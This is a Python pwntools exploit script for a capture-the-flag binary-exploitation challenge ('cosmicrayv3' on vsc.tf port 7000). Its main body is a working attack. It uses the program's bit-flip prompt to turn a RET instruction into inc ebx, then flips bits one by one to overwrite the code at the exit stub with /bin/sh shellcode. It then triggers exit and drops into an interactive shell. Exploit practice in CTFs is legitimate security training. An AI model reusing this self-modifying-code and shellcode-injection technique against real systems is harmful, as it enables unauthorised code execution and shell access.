#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwntmpl -nc 'nc vsc.tf 7000'
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './cosmicrayv3'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'vsc.tf'
port = int(args.PORT or 7000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

exit_bytes = [0xf3, 0x0f, 0x1e, 0xfa, 0xf2, 0xff, 0x25, 0x5d, 0x2e, 0x00, 0x00, 0x0f, 0x1f, 0x44, 0x00, 0x00, 0xf3, 0x0f, 0x1e, 0xfa, 0x31, 0xed, 0x49, 0x89, 0xd1, 0x5e, 0x48, 0x89, 0xe2, 0x48, 0x83, 0xe4, 0xf0, 0x50, 0x54, 0x45, 0x31, 0xc0, 0x31, 0xc9, 0x48, 0xc7, 0xc7, 0xab, 0x15, 0x40, 0x00, 0xff, 0x15, 0x3b, 0x2e, 0x00, 0x00, 0xf4, 0x66, 0x2e, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf3, 0x0f, 0x1e, 0xfa, 0xc3, 0x66, 0x2e, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0xb8, 0x10, 0x40, 0x40, 0x00, 0x48, 0x3d, 0x10, 0x40, 0x40, 0x00, 0x74, 0x13, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x85]
exit_address = 0x401180
desired_bytes = asm(shellcraft.sh())

def flip(address, bit):
    io.recvuntil(b"through:\n")

    io.sendline(hex(address).encode())
    io.recvuntil(b"flip:")
    io.sendline(str(bit).encode())


flip(0x4015aa, 0) # Flip the MSB (bit number 0) to change RET into `inc ebx`

curr_address = exit_address
for i in range(len(desired_bytes)):
    shellcode_bits = bin(desired_bytes[i])[2:]
    exit_bits = bin(exit_bytes[i])[2:]

    # Fill 0's at the start

    shellcode_bits = "0" * (8 - len(shellcode_bits)) + shellcode_bits 
    exit_bits = "0" * (8 - len(exit_bits)) + exit_bits

    for i in range(len(exit_bits)):
        if exit_bits[i] != shellcode_bits[i]:
            flip(curr_address, i)
    curr_address += 1

flip(0, -1) # Trigger exit@plt and thus the shellcode

io.interactive()
